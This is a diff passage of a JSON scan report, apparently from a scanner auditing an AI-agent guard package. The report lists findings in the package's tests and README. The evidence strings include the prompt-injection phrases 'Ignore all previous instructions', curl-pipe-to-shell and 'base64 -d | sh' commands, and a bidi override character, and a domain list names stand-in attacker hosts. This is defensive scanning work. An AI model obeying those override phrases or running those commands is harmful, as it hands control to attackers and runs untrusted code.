+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_llamaindex_real.py",
+      "line": 27,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "caa9e5b04a1e6703d67a77322b054945dec333bf6b22c9ac46a42895df4a3ee2"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_coverage_cli_evidence_stats.py",
+      "line": 31,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "e013b101323711e68e38cda27dad3182dd8573b0ee917f0fddb952d6700675d9"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_framework_context.py",
+      "line": 15,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "ced67c2964ce2c7875284f0c8ac7ae36fb35448bdca9672640a990d7ac170ea3"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_fail_open_core.py",
+      "line": 32,
+      "evidence": "\\u{202e}",
+      "file_sha256": "2e26a3ec161caeff2518404b8e915fdea021428c4682ec95007747ca10da2731"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_fail_open_core.py",
+      "line": 27,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "2e26a3ec161caeff2518404b8e915fdea021428c4682ec95007747ca10da2731"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_scan_coverage_exit.py",
+      "line": 90,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "691a8a4c86092064839921d1465daec6c5acfe3c16bf22186b2ad2dc59bfee01"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_destructive_braces.py",
+      "line": 37,
+      "evidence": "curl{' + COMMAS + '} -fsSL https://example.com/i.sh | sh",
+      "file_sha256": "ea6f7bc08ad2e58db03d400cab8569b4709e5d9e5a60265a08ba0b21b292a528"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_scan_github_reason.py",
+      "line": 48,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "96bdab2c887d19d0d2a947a038aa856f5a504e64ab20c6c7f49d1cf1e45510b5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_scan_github_reason.py",
+      "line": 42,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "96bdab2c887d19d0d2a947a038aa856f5a504e64ab20c6c7f49d1cf1e45510b5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_rules_advisory.py",
+      "line": 20,
+      "evidence": "Forget all previous instructions",
+      "file_sha256": "8d6eff202d85b1999a9590524f9056fee3cce6ccc58fb66cd4c579b64aab582d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_guard_stream_split_secret.py",
+      "line": 15,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "731cfa914103fc71eee7708c8761e8171a5a9d2fc40daa88d38d239c9cc28a23"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_rules_unicode.py",
+      "line": 44,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "5a4120d4627b5ada75aa8b932b6c96f0540bce3078d7dbb295d4207cc9802361"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_scan_no_values.py",
+      "line": 28,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "0779902db9162a15919ec0ff5d015e9c8523cf33d6ed34aafcb0f1910d798963"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_cli_plain_output.py",
+      "line": 16,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "e63eccc36226df8e10e9eddefdc0b1194e18afe30a9586ffbe0e0702b233cf3e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_redactor_edges.py",
+      "line": 35,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "8ba06572566f245ffa67dd0dd51d288348794474e7db8ef186479a673ab83636"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_destructive_families.py",
+      "line": 35,
+      "evidence": "curl https://example.com/install.sh | sh",
+      "file_sha256": "1e2f85db775d883aac600132e011dd752ae399d787f24293bfee48977bd62bf1"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_v123_features.py",
+      "line": 91,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "71afbf92395cc9b752b59b02f5d9d66e7ffa215a0cda1899f425988061cb370c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_guard_args_base64_window_edge.py",
+      "line": 11,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "fa73b63e99c8d6052ef1aedea7316974be136af276cee6f4b30529167396e650"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_guard_args_base64_window_edge.py",
+      "line": 10,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "fa73b63e99c8d6052ef1aedea7316974be136af276cee6f4b30529167396e650"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_llamaindex_promptfoo_unit.py",
+      "line": 14,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "588d9b9e142fd5cdf2e3a40d49bada030a354c5e69ec1b6e054cb5ab79ec4473"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_on_block_ignore_warns.py",
+      "line": 9,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "c145282bbec27e662ba1e490ee2b3a42edfd35f382593a5860f28322e92148c4"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_on_block_validation.py",
+      "line": 8,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "84381e268e45f328698d22b65303bb9da2075b17e7a3b50991a8367365d35a6d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_rules_redos.py",
+      "line": 192,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "b33780bb01dec5ee01cc0a587f3782c6a5e478902b14eca0438ec93952af2bed"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_scan_secrets.py",
+      "line": 102,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "0a3c2671f9083bbec5041160de204a8caf9c966a0d327e00d0dc94b0292a6bce"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_guard_nesting.py",
+      "line": 55,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "468a42436cf47a4b71afca3bcfa401c47993b65bc62d1557e84b3734a5b6f0fd"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_evaluate_text_keyword.py",
+      "line": 9,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "7812f15f992da055e8ff55341d3951eb11e51f2946b8e4f9dbb1ce7d4106170f"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_guard_wrapper_shapes.py",
+      "line": 14,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "e7a329bec30f3beccbc2277e920c0ac4690c431a47b416fdb84d8a16bbefd739"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_rules_tiers.py",
+      "line": 32,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "d9d88664a87e6b784c78dda6ef1910bcd01d28d2c0202473a624be7d1c651947"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/tests/test_cli_encoding.py",
+      "line": 18,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "424ce2a38ee89d4e8a9a6ed02ff80538a117fa5039dc9886b8ad35cef17186d8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/README.md",
+      "line": 153,
+      "evidence": "curl https://example.invalid/x.sh | sh",
+      "file_sha256": "eba346f7f5590a5b20e4794c71d8a852af3d981606876227bb1c34c9f577b22e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/packages/zn-gate-py/README.md",
+      "line": 81,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "eba346f7f5590a5b20e4794c71d8a852af3d981606876227bb1c34c9f577b22e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/.github/scripts/test-pre-commit-hooks.sh",
+      "line": 79,
+      "evidence": "curl https://example.com/x.sh | sh",
+      "file_sha256": "3f830f8cdcd0acdebd2977bb1f776a51ba0ec3ac41aa74e46e7eca32cdeecbbf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "zn-b28b0e7c80d79e8577df834a1741bb42c3119e87/.github/scripts/test-pre-commit-hooks.sh",
+      "line": 70,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "3f830f8cdcd0acdebd2977bb1f776a51ba0ec3ac41aa74e46e7eca32cdeecbbf"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "127.0.0.1.evil.test, 127.0.0.2, age-encryption.org, agent-plugins.org, ai-sdk.dev, anysphere.cursor-deeplink, app.example.test, app.example.test.evil.test, attacker-c2.com, cdn-zcode.z.ai, cli.github.com, code.visualstudio.com, cyclonedx.org, db.example.com, discord.example.com, discord.gg, docs.cline.bot, docs.continue.dev, docs.devin.ai, dotenvx.com, dspy.ai, evil.sh, evil.test, feross.org, glama.ai, haystack.deepset.ai, hooks.example.com, keepachangelog.com, localhost.evil.test, localhost.example.net, mastra.ai, modelcontextprotocol.io, openai.github.io, openfontlicense.org, paypal.me, pre-commit.com, promptfoo.dev, pydantic.dev, scripts.sil.org, semver.org, siem.example.test, sub.localhost, token.actions.githubusercontent.com, webhook.site, www.jetbrains.com, www.linkedin.com, www.patreon.com, www.python.org, www.w3.org, zed.dev",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "127.0.0.1",
+    "127.0.0.1.evil.test",
+    "127.0.0.2",
+    "age-encryption.org",
+    "agent-plugins.org",
+    "ai-sdk.dev",
+    "antigravity.google",
+    "anysphere.cursor-deeplink",
+    "api.example.com",
+    "api.example.org",
+    "api.example.test",
+    "api.github.com",
+    "api.stripe.com",
+    "api.usezn.com",
+    "app.example.com",
+    "app.example.test",
+    "app.example.test.evil.test",
+    "attacker-c2.com",
+    "attacker.com",
+    "attacker.example.invalid",
+    "auth.example.com",
+    "auth.example.org",
+    "cdn-zcode.z.ai",
+    "cli.github.com",
+    "code.claude.com",
+    "code.visualstudio.com",
+    "cursor.com",
+    "cyclonedx.org",
+    "db.example.com",
+    "developers.openai.com",
+    "discord.com",
+    "discord.example.com",
+    "discord.gg",
+    "docs.astral.sh",
+    "docs.cline.bot",
+    "docs.continue.dev",
+    "docs.devin.ai",
+    "docs.github.com",
+    "docs.npmjs.com",
+    "dotenvx.com",
+    "dspy.ai",
+    "evil.com",
+    "evil.example",
+    "evil.sh",
+    "evil.test",
+    "example.com",
+    "example.invalid",
+    "example.test",
+    "example.webhook.office.com",
+    "feross.org",
+    "geminicli.com",
+    "git.example.com",
+    "github.com",
+    "glama.ai",
+    "haystack.deepset.ai",
+    "hooks.example.com",
+    "hooks.slack.com",
+    "host.example.com",
+    "huggingface.co",
+    "img.shields.io",
+    "json.schemastore.org",
+    "keepachangelog.com",
+    "learn.chatgpt.com",
+    "localhost.evil.test",
+    "localhost.example.net",
+    "mastra.ai",
+    "mcp.example.com",
+    "modelcontextprotocol.io",
+    "nodejs.org",
+    "openai.github.io",
+    "opencode.ai",
+    "opencollective.com",
+    "openfontlicense.org",
+    "other.example.com",
+    "paulmillr.com",
+    "paypal.me",
+    "pre-commit.com",
+    "promptfoo.dev",
+    "pydantic.dev",
+    "pypi.org",
+    "registry.npmjs.org",
+    "scripts.sil.org",
+    "semver.org",
+    "siem.example.test",
+    "static.modelcontextprotocol.io",
+    "sub.localhost",
+    "team.example.com",
+    "token.actions.githubusercontent.com",
+    "usezn.com",
+    "webhook.site",
+    "www.docker.com",
+    "www.jetbrains.com",
+    "www.linkedin.com",
+    "www.npmjs.com",
+    "www.patreon.com",
+    "www.python.org",
+    "www.w3.org",
+    "zcode.z.ai",
+    "zed.dev",
+    "zn.example.com"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
